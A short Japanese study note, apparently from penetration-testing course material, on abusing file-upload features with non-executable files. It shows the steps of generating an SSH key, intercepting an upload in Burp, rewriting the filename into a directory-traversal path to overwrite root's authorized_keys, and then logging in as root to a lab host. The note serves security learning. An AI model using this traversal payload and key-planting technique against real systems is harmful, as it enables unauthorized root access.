# 概要
- .phpなどの実行ファイル以外にもアップロードされると深刻な被害をもたらす場合がある
- GoogleDriveなどは実行ファイルをアップロードできるがそのファイルがシステムに影響を及ぼさないように構築されている

# 例 SSH公開鍵を用いた侵入
## 概要
ターゲットのauthorizedkeyファイルを上書きし、sshログインする
## 手順
1. 自身の公開鍵の準備
```bash
# 公開鍵の作成 
kali@kali:~$ ssh-keygen
Generating public/private rsa key pair.
Enter file in which to save the key (/home/kali/.ssh/id_rsa): fileup
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in fileup
Your public key has been saved in fileup.pub
...
# 公開鍵のをauthorized_keysファイルに書き込み
kali@kali:~$ cat fileup.pub > authorized_keys
```

2. fileのアップロード
- Burpを起動し、Interceptをon
- 作成したauthorized_keysをupload
![](../../../../assets/images/Pasted%20image%2020260429180346.png)
- Interceptした通信をディレクトリトラバーサルを利用し、送信
```bash
# filenameの箇所をディレクトリトラバーサルの形で改ざん
filename="../../../../../../../root/.ssh/authorized_keys"
```
![](../../../../assets/images/Pasted%20image%2020260429180338.png)

3. アップロードしたファイルを使用してログイン
```
# SSH known_hostsファイルを削除しエラー回避
 rm ~/.ssh/known_hosts

ssh -p 2222 -i fileup root@mountaindesserts.com
# ターゲット上では2222でsshdが待ち受けている
```